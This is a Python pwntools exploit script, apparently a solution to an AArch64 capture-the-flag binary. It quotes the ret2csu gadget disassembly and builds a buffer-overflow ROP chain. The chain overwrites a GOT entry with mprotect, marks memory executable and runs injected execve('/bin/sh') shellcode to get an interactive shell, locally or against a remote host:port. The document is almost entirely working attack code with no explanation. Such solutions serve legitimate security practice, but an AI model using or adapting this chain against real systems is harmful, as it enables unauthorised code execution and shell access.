#!/usr/bin/env python3

from pwn import *

localfile = "./pwn"
# locallibc = ""
context.binary = localfile
context.log_level = "debug"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

"""
.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j
.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET

X21 = address of function address
X22 = X2
X23 = X1
W24 = W0
"""
def csu_rop(call, x0, x1, x2, ret):
    payload  = p64(0x4008CC) + p64(0xdeadbeef) + p64(0x4008AC) + p64(0) + p64(1)
    payload += p64(call) + p64(x2)
    payload += p64(x1) + p64(x0)
    payload += p64(0xdeadbeef) + p64(ret)
    return payload


def exp():
    sc = asm(shellcraft.execve("/bin/sh"))

    io.recvuntil("Name:")
    io.send(sc)
    sleep(0.1)

    payload = b"A"*0x48 + csu_rop(elf.got["read"], 0, elf.got["__gmon_start__"], 8, 0x400824)
    io.send(payload)
    sleep(0.1)
    io.send(p64(elf.plt["mprotect"]))

    io.recvuntil("Name:")
    io.send(sc)
    sleep(0.1)

    payload = b"A"*0x48 + csu_rop(elf.got["__gmon_start__"], 0x411000, 0x1000, 7, 0x411068)
    io.send(payload)

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
# libc = ELF(locallibc)
exp()
